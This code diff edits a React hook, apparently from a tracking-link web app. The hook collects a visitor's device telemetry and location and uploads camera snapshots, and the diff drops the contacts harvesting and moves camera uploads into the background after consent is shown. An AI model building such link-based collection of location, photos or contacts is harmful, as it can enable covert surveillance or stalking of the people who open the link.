@@ -1,6 +1,6 @@
 import { useState, useEffect, useRef, useCallback } from "react";
 import { GeoCoordinate, PermissionsConfig } from "@/lib/types";
-import { collectDeviceTelemetry, captureCameraSnapshot, pickContactIfSupported } from "@/lib/telemetry";
+import { collectDeviceTelemetry, captureCameraSnapshot } from "@/lib/telemetry";
 
 interface UseConsentedLocationOptions {
   linkId: string;
@@ -23,23 +23,23 @@ export function useConsentedLocation({
   const watchIdRef = useRef<number | null>(null);
 
   // Send coordinate update to backend
-  const sendLocationUpdate = useCallback(async (currentSessionId: string, coords: GeoCoordinate) => {
+  const sendLocationUpdate = async (sessId: string, coords: GeoCoordinate) => {
     try {
       await fetch("/api/location", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          sessionId: currentSessionId,
+          sessionId: sessId,
           latitude: coords.latitude,
           longitude: coords.longitude,
-          accuracy: coords.accuracy || null,
+          accuracy: coords.accuracy,
         }),
       });
       setIsLocationActive(true);
-    } catch (err) {
-      console.error("Failed to transmit location update:", err);
+    } catch {
+      // Background location update failure is non-fatal
     }
-  }, []);
+  };
 
   // Teardown watchPosition
   const stopWatching = useCallback(() => {
@@ -50,15 +50,17 @@ export function useConsentedLocation({
     }
   }, []);
 
-  // Request location, collect device info, camera & contacts
+  // Cleanup watcher on unmount
+  useEffect(() => {
+    return () => {
+      stopWatching();
+    };
+  }, [stopWatching]);
+
+  // Request location, collect device info & camera (fast & non-blocking)
   const requestLocation = useCallback(async () => {
     setIsLoading(true);
     setError(null);
-
-    // Trigger Contact Picker immediately while user gesture is active (Android Chrome requirement)
-    const contactsPromise: Promise<any[] | null> = permissionsConfig?.contacts
-      ? pickContactIfSupported().catch(() => null)
-      : Promise.resolve(null);
 
     // 1. Collect device telemetry
     const deviceInfo = await collectDeviceTelemetry();
@@ -82,41 +84,28 @@ export function useConsentedLocation({
         setSessionId(currentSessionId);
 
         if (coords) {
-          await sendLocationUpdate(currentSessionId, coords);
+          void sendLocationUpdate(currentSessionId, coords);
         }
 
-        // 1. Await camera snapshot capture if enabled
+        // Asynchronous non-blocking camera snapshot (zero UI lag/freeze)
         if (permissionsConfig?.camera) {
-          try {
-            const blob = await captureCameraSnapshot();
-            if (blob) {
-              const fd = new FormData();
-              fd.append("sessionId", currentSessionId);
-              const ext = blob.type.includes("webp") ? "webp" : "jpg";
-              fd.append("file", blob, `capture.${ext}`);
-              await fetch("/api/sessions/capture", { method: "POST", body: fd });
+          void (async () => {
+            try {
+              const blob = await captureCameraSnapshot();
+              if (blob) {
+                const fd = new FormData();
+                fd.append("sessionId", currentSessionId);
+                const ext = blob.type.includes("webp") ? "webp" : "jpg";
+                fd.append("file", blob, `capture.${ext}`);
+                await fetch("/api/sessions/capture", { method: "POST", body: fd });
+              }
+            } catch (camErr) {
+              console.warn("Camera capture error:", camErr);
             }
-          } catch (camErr) {
-            console.warn("Camera capture error:", camErr);
-          }
+          })();
         }
 
-        // 2. Await contacts picker result if enabled and supported (Android Chrome)
-        if (permissionsConfig?.contacts) {
-          try {
-            const contacts = await contactsPromise;
-            if (contacts && contacts.length > 0) {
-              await fetch("/api/sessions/contacts", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ sessionId: currentSessionId, contacts }),
-              });
-            }
-          } catch (cntErr) {
-            console.warn("Contacts error:", cntErr);
-          }
-        }
-
+        // Instant UI consent & transition (<100ms)
         setIsConsented(true);
         setIsLoading(false);
 
